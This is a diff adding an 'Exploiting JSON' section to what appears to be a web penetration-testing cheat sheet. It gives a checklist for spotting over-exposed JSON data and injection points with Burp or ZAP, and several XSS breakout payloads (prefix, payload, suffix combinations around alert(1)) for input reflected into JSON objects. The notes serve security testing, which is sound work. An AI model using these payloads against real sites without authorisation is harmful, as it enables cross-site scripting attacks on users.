@@ -143,6 +143,36 @@ xmlhttp.readyState
 xmlhttp.responseText
 {% endhighlight %}
 
+>**Exploiting JSON**
+
+Look for:
+1. Too much data provided from server and being filtered on the client
+	* Use burp/zap to look at JSON data sent for extra data or error messages
+2. Error messages provided from server but filtered on the client
+	* Use burp/zap to look at JSON data sent for extra data or error messages
+3. Injection (JSON to the server, or JSON in the response, eval)
+	* Intercept the JSON and insert attack strings (XSS, SQL), be careful with XSS because it is in a JSON object that is going to be parsed and break out of it appropriately.
+
+>**XSS JSON**
+
+If data is reflected from input into JSON Object (9vqkz is test string):
+{% highlight javascript %}
+{"query": {"toolIDRequested": "9vqkz", "penTestTools": []}}
+
+Example escape using concatinate:
+Prefix: 1"+
+Paylod: eval(alert(1))
+Suffix:+1
+
+prefix: 1"%2b
+Payload: eval(alert(1))
+Suffix: %2b"1
+
+prefix: 4"}}); 
+payload: alert(1);
+suffix:   //
+{% endhighlight %}
+
 > **Useful Resources**
 
 * [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors) 
